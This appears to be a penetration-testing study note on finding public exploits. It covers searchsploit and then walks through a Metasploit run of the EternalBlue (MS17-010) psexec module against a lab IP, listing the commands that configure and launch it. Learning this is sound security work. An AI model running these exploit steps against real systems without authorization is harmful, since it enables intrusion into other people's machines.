# Public Exploits

Once we have used our #enumeration tools and performed various discovery related tasks, we can further investigate this data and find known exploits for the sites we have assessed. Even a basic search can reveal common vulnerabilities and the associated exploits for any version or directory we find.

#### Searchsploit

#Searchspolit is a common exploit discovery tool that uses information from the discovery phase to determine possible vectors for attack.

Install Searchsploit with the following command:

> sudo apt install exploitdb -y

Once installed, we can now use searchsploit to search for a specific application, in this case it's openssh 7.2:

> searchsploit openssh 7.2

##### Other Database Tools

Exploit DB, Rapid7DB, and Vulnerability Lab are alternative tools that also identify known public vulnerabilities for web applications.

### Metasploit

Metasploit Framework ( #MSF) is a useful tool for exploitations that offers a range of features. Metasploit can run reconnaissance scripts, verify scripts without compromising a target, connect to shells for command execution, and enumeration of remote hosts.

We can open Metasploit with the following command:

> msfconsole

The following command will examine our target for the eternalblue exploit:

> search exploit eternalblue

This will return the specific exploit for this service. We can then employ this exploit with the following command: 

> use exploit/windows/smb/ms17_010_psexec

This will not work, as we need to configure the exploit before it can be run:

> show options

Within this generated menu, we can see what aspects are required in order to perform this exploit. In this case we need to supply 'RHOSTS' - the #IP address(es) of the target and 'LHOSTS', which is the IP of your own machine.

> set RHOSTS 10.10.10.40

>set LHOST tun0

> check

At this point, Metasploit should verify whether the exploit will be able to be used or not. Now we can run the exploit with the command 'exploit' or 'run'.

> exploit
